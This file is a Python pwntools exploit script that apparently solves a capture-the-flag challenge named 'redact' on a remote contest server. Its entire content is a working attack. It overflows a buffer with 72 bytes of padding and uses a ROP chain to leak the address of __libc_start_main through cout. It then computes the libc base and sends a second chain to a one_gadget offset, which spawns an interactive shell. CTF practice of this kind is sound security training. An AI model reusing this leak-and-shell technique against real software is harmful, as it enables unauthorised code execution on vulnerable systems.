#!/usr/bin/env python3

from pwn import *

exe = ELF("./redact")
libc = ELF("./libc.so.6")

context.binary = exe

# r = process([exe.path])
r = remote("lac.tf", 31181)

rop1 = ROP(exe, badchars=b"\n")
rop1.call("_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc", (exe.symbols["_ZSt4cout"], exe.got.__libc_start_main))
rop1.raw(rop1.find_gadget(["ret"]))
rop1.main()
log.info(rop1.dump())

r.sendlineafter(b"text: ", b"")
r.sendlineafter(b"placeholder: ", rop1.generatePadding(0, 72) + rop1.chain())
r.sendlineafter(b"redact: ", b"0")
r.recvline()
leak = unpack(r.recvuntil(b"Enter", drop=True).ljust(8, b"\0"))
log.info(f"{hex(leak)=}")
libc.address = leak - libc.symbols.__libc_start_main
log.info(f"{hex(libc.address)=}")

rop2 = ROP([exe, libc], badchars=b"\n")
rop2(r12=0, r13=0)
rop2.raw(libc.address + 0xc961a)
log.info(rop2.dump())

r.sendlineafter(b"placeholder: ", rop2.generatePadding(0, 72) + rop2.chain())
r.sendlineafter(b"redact: ", b"0")

r.interactive()
